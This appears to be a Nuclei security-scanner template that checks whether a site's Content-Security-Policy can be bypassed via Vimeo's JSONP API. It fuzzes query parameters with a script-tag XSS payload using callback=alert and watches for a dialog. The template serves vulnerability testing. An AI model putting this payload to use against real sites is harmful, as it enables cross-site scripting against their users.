id: vimeo-csp-bypass

info:
  name: Content-Security-Policy Bypass via Vimeo
  author: renniepak,DhiyaneshDK
  severity: medium
  reference:
    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  metadata:
    verified: true
  tags: xss,csp-bypass,vimeo

headless:
  - steps:
      - action: navigate
        args:
          url: "{{BaseURL}}"

      - action: waitdialog
        name: vimeo_csp_xss
        args:
          max-duration: 5s

    payloads:
      injection:
        - '<script src="https://vimeo.com/api/v2/video/1006042481.json?callback=alert"></script>'

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{url_encode(injection)}}"

    matchers:
      - type: dsl
        dsl:
          - "vimeo_csp_xss == true" 